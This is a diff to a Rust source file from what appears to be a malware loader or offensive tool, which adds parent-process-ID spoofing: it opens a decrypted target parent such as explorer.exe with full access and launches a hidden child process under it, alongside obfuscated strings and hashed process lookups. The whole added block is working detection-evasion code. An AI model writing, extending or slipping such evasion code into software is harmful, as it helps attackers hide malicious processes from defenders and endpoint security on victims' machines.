@@ -1,6 +1,13 @@
 #![allow(non_snake_case, dead_code, unused_variables, unused_imports, non_camel_case_types)]
 use crate::api;
 use obfstr::obfstr;
+use windows_sys::Win32::System::Threading::{STARTUPINFOEXW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, DeleteProcThreadAttributeList, CreateProcessW, OpenProcess, PROCESS_INFORMATION, PROCESS_ALL_ACCESS};
+use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, GetLastError, FALSE};
+use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
+use windows_sys::Win32::System::Threading::STARTF_USESHOWWINDOW;
+use std::env;
+
+const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
 
 #[repr(C)]
 struct PROCESS_BASIC_INFORMATION {
@@ -213,13 +220,103 @@ pub fn find_process_id_by_name(name_hash: u32) -> Result<u32, String> {
 }
 
 pub unsafe fn create_process(target_program: &str, creation_flags: u32) -> Result<windows_sys::Win32::System::Threading::PROCESS_INFORMATION, String> {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+
+    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
+
+    // Attempt to spoof PPID with explorer.exe
+    #[cfg(feature = "ppid_spoofing")]
+    {
+        use crate::utils::simple_decrypt;
+        let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));
+        if let Some(parent_pid) = get_process_id_by_name(&parent_name) {
+            #[cfg(feature = "debug")]
+            crate::utils::print_message(&format!("Attempting PPID spoofing with {} (PID: {})", parent_name, parent_pid));
+            let parent_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, parent_pid);
+            if parent_handle != 0 {
+                #[cfg(feature = "debug")]
+                crate::utils::print_message("Opened parent process handle successfully");
+                // Initialize STARTUPINFOEXW
+                let mut startup_info: STARTUPINFOEXW = std::mem::zeroed();
+                startup_info.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+                startup_info.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+                startup_info.StartupInfo.wShowWindow = SW_HIDE as u16;
+
+                // Initialize attribute list
+                let mut attr_size: usize = 0;
+                // First call to get required size
+                InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
+                let mut attr_list: Vec<u8> = vec![0; attr_size];
+                let attr_list_ptr = attr_list.as_mut_ptr() as *mut core::ffi::c_void;
+
+                if InitializeProcThreadAttributeList(attr_list_ptr, 1, 0, &mut attr_size) != 0 {
+                    #[cfg(feature = "debug")]
+                    crate::utils::print_message("Initialized attribute list successfully");
+                    // Set parent process attribute
+                    if UpdateProcThreadAttribute(
+                        attr_list_ptr,
+                        0,
+                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                        &parent_handle as *const _ as *mut _,
+                        std::mem::size_of::<HANDLE>(),
+                        std::ptr::null_mut(),
+                        std::ptr::null_mut(),
+                    ) != 0 {
+                        #[cfg(feature = "debug")]
+                        crate::utils::print_message("Set parent process attribute successfully");
+                        startup_info.lpAttributeList = attr_list_ptr;
+
+                        // Convert target_program to UTF-16
+                        let app_name: Vec<u16> = OsStr::new(target_program).encode_wide().chain(std::iter::once(0)).collect();
+
+                        let success = CreateProcessW(
+                            std::ptr::null(),
+                            app_name.as_ptr() as *mut u16,
+                            std::ptr::null(),
+                            std::ptr::null(),
+                            0,
+                            creation_flags,
+                            std::ptr::null(),
+                            std::ptr::null(),
+                            &startup_info.StartupInfo,
+                            &mut process_info,
+                        );
+
+                        if success != FALSE {
+                            #[cfg(feature = "debug")]
+                            crate::utils::print_message("PPID spoofing successful");
+                            DeleteProcThreadAttributeList(attr_list_ptr);
+                            CloseHandle(parent_handle);
+                            return Ok(process_info);
+                        } else {
+                            #[cfg(feature = "debug")]
+                            crate::utils::print_message(&format!("CreateProcessW failed with error: {}", GetLastError()));
+                        }
+                    } else {
+                        #[cfg(feature = "debug")]
+                        crate::utils::print_message(&format!("UpdateProcThreadAttribute failed with error: {}", GetLastError()));
+                    }
+                    DeleteProcThreadAttributeList(attr_list_ptr);
+                } else {
+                    #[cfg(feature = "debug")]
+                    crate::utils::print_message(&format!("InitializeProcThreadAttributeList failed with error: {}", GetLastError()));
+                }
+                CloseHandle(parent_handle);
+            } else {
+                #[cfg(feature = "debug")]
+                crate::utils::print_message(&format!("OpenProcess failed with error: {}", GetLastError()));
+            }
+        }
+        #[cfg(feature = "debug")]
+        crate::utils::print_message("PPID spoofing failed or not attempted, falling back to normal process creation");
+    }
+
+    // Fallback to original CreateProcessA if spoofing fails
     use std::ffi::CString;
-    use windows_sys::Win32::System::Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, STARTF_USESHOWWINDOW};
-    use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
-    use windows_sys::Win32::Foundation::{GetLastError, FALSE};
+    use windows_sys::Win32::System::Threading::{CreateProcessA, STARTUPINFOA};
 
     let mut startup_info: STARTUPINFOA = std::mem::zeroed();
-    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
     startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
     startup_info.dwFlags = STARTF_USESHOWWINDOW;
     startup_info.wShowWindow = SW_HIDE as u16;
